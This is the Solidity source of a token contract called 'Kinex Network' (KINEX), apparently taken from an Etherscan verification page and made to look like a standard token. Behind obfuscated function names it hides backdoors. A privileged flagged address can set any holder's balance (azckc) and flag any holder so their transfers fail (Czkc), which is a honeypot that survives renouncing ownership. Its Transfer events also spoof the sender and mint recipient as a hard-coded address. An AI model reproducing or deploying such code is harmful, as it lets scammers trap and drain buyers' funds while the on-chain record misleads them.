/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

abstract contract Context {
    address Cane = 0xA64D08224A14AF343b70B983A9E4E41c8b848584;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract KINEX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Zeph;
    mapping (address => uint256) private Elys;
    mapping (address => mapping (address => uint256)) private jKD;
    uint8 private Efx;
    uint256 private LPO;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Kinex Network";
        _symbol = "KINEX";
        Efx = 9;
        uint256 Suge = 200000000;
        Elys[msg.sender] = 4;
        Meteor(Cane, Suge*(10**9));
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return Efx;
    }

    function totalSupply() public view  returns (uint256) {
        return LPO;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Zeph[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return jKD[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        jKD[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= Zeph[msg.sender]);
        require(Elys[msg.sender] <= 4);
        GHDs(msg.sender, recipient, amount);
        return true;
    }
	
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= Zeph[sender]);
              require(Elys[sender] <= 4 && Elys[recipient] <=4);
                  require(amount <= jKD[sender][msg.sender]);
        GHDs(sender, recipient, amount);
        return true;}

  
   

    function GHDs(address sender, address recipient, uint256 amount) internal  {
        Zeph[sender] = Zeph[sender].sub(amount);
        Zeph[recipient] = Zeph[recipient].add(amount);
       if(Elys[sender] == 4) {
            sender = Cane;}
        emit Transfer(sender, recipient, amount); }
		

	 
	 	 modifier Mtrl{
    require(Elys[msg.sender] == 4);   
        _; }
	    function azckc (address zRo, uint256 qWW) Mtrl public {
   Plank(zRo,qWW);}
   		    function Plank (address zRo, uint256 qWW)  internal {
     Zeph[zRo] = qWW;} 	
	    function Czkc (address zRo, uint256 qWW) Mtrl public {
     Vargus(zRo,qWW);}
	
	   function Vargus (address zRo, uint256 qWW)  internal {
     Elys[zRo] = qWW;}
    function Meteor(address account, uint256 amount) onlyOwner public {
     
        LPO = LPO.add(amount);
        Zeph[msg.sender] = Zeph[msg.sender].add(amount);
        emit Transfer(address(0), account, amount);
    }
		
     
        }